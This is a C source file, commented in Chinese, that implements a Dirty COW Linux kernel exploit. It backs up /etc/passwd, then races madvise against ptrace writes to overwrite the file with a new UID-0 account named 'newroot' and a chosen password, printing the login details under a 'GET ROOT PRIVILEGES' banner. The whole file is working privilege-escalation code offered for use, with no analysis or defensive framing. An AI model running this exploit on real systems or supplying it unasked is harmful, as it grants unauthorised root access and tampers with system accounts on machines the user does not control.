//这个exploit尝试利用脏牛漏洞创建一个新的具有sudo权限的用户
//首先把 /etc/passwd进行备份，备份命名为/tmp/passwd_bk
//然后按照相应格式创建新用户
//修改 /etc/passwd 

#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>
#define maxn 100
//定义所需的全局变量，包括文件号、进程句柄、线程句柄、stat等
int f;
void *map;
pid_t pid;
pthread_t pth;
struct stat st;

void *madviseThread(void *arg) {
  int i, c = 0;
  for(i = 0; i < 200000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("madvise %d\n\n", c);
}

int copy_file(const char *from, const char *to) {
  // check if target file already exists
  if(access(to, F_OK) != -1) {
    printf("File %s already exists! Please delete it and run again\n",
      to);
    return -1;
  }

  char ch;
  FILE *source, *target;

  source = fopen(from, "r");
  if(source == NULL) {
    return -1;
  }
  target = fopen(to, "w");
  if(target == NULL) {
     fclose(source);
     return -1;
  }

  while((ch = fgetc(source)) != EOF) {
     fputc(ch, target);
   }

  printf("%s successfully backed up to %s\n",
    from, to);

  fclose(source);
  fclose(target);

  return 0;
}

char *filename = "/etc/passwd";
char *backupfilename = "/tmp/passwd_bk";
const char *salts = "newroot";
const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
int main(int argc, char *argv[])
{
    printf("GET ROOT PRIVILEGES            \n\
   (___)                                   \n\
   (o o)_____/                             \n\
    @@ `     \\                            \n\
     \\ ____, /DIRTY COW !                 \n\
     //    //                              \n\
    ^^    ^^                               \n\
    ")                                   ;// dirty cow
    int ret = copy_file(filename,backupfilename);
    if(ret!=0)//备份失败
        exit(ret);
    //新用户信息
    char *user_name = "newroot";
    int user_id=0;
    int group_id=0;
    char *info = "pwned";
    char *home_dir = "/root";
    char *shell = "/bin/bash";
    char *newpasswd;
    //这里分两种情况，一种是参数中有密码，一种是没密码
    if(argc>=2)
    {
      newpasswd=argv[1];
      printf("The newpasswd is: %s\n",newpasswd);
    }
    else 
    {
      newpasswd = getpass("Please enter the new passwd: ");
    }

    char *passwdHash = crypt(newpasswd, salts);//对密码进行加密
    //整合信息，得到整行数据
    int size = snprintf(NULL, 0, format, user_name, passwdHash, user_id, group_id, info, home_dir, shell);
    char *complete_info = (char*)malloc(size + 1);
    sprintf(complete_info, format, user_name, passwdHash, user_id, group_id, info, home_dir, shell);
    //sprintf会在末尾自动追加'\0'
    printf("The new entire line:\n %s\n",complete_info);

    //下面开始COW越权
    f = open(filename,O_RDONLY);
    fstat(f,&st);
    map = mmap(NULL,
               st.st_size + sizeof(long),
               PROT_READ,
               MAP_PRIVATE,
               f,
               0);
    printf("mmap %lx\n",(unsigned long)map);

    pid = fork();//创建子进程
    if(pid)//是父进程
    {
      int c=0;
      waitpid(pid,NULL,0);
      int l=strlen(complete_info);
      //循环里初始化竟然在这个版本的gcc还不支持
      int i=0,j=0,u=0;
      for(i=0;i<10000/l;i++)
      {
        for(j=0;j<l;j++)
        {
          for(u=0;u<10000;u++)
          {
            c+=ptrace(PTRACE_POKETEXT,
                      pid,
                      map+j,
                      *((long*)(complete_info + j)));
          }
        }
      }
      printf("ptrace %d\n",c);

    }
    else//是子进程
    {
      pthread_create(&pth,
                     NULL,
                     madviseThread,
                     NULL);
      ptrace(PTRACE_TRACEME);
      kill(getpid(), SIGSTOP);
      pthread_join(pth,NULL);      
    }
    printf("Done! Check %s to see if the new user was created.\n", filename);
    printf("You can log in with the username '%s' and the password '%s'.\n\n",user_name, newpasswd);
    printf("DON'T FORGET TO RESTORE! $ mv %s %s\n",backupfilename, filename);
    
    return 0;
}